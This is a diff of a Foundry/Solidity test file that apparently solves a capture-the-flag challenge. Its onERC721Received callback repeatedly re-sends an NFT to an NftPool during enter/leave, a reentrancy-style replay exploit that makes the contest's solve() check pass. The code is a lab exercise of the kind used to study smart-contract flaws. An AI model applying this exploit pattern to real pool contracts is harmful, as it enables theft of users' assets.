@@ -9,12 +9,13 @@ contract NFTPoolTest is Test {
     NftPool public nftPool;
     Contest public contest;
     uint256 replayAmount = 0;
-    bool didInitMint = false;
 
+    /**
+     * EXPLOIT START *
+     */
     constructor() {
         contest = new Contest();
         contest.init();
-        didInitMint = true;
     }
 
     function testAttack() public {
@@ -24,6 +25,7 @@ contract NFTPoolTest is Test {
         nft.approve(address(nftPool), tokenId);
         nftPool.enter(tokenId);
         nftPool.leave(tokenId);
+
         assertEq(contest.solve(), true);
     }
 
@@ -33,10 +35,6 @@ contract NFTPoolTest is Test {
         uint256 tokenId,
         bytes memory
     ) external returns (bytes4) {
-        if (!didInitMint) {
-            return this.onERC721Received.selector;
-        }
-
         if (replayAmount < 100) {
             replayAmount++;
             nft.safeTransferFrom(address(this), address(nftPool), 1);
@@ -44,4 +42,8 @@ contract NFTPoolTest is Test {
         }
         return this.onERC721Received.selector;
     }
+
+    /**
+     * EXPLOIT END *
+     */
 }
